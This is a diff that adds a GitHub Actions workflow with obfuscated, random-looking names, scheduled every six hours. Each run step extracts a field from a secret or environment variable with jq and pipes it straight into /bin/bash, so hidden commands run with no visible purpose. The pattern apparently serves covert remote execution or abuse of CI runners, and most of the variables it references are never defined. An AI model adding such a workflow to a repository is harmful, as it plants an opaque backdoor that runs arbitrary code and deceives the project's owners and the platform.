@@ -1,0 +1,24 @@
+name: tengtexie6789
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tengtexie6789
+        env:
+          zikf39850: ${{ secrets.zikf39850 }}
+        run: |
+          echo $zikf39850 | jq -r .x55199 | /bin/bash
+          echo $pe49 | jq -r .xi341 | /bin/bash
+          echo $h86107 | jq -r .gfwc4925 | /bin/bash
+          echo $fbgqd5563 | jq -r .ytibq48 | /bin/bash
+          echo $k17 | jq -r .h0474 | /bin/bash
+          echo $yjeq448 | jq -r .drxpj33424 | /bin/bash
+
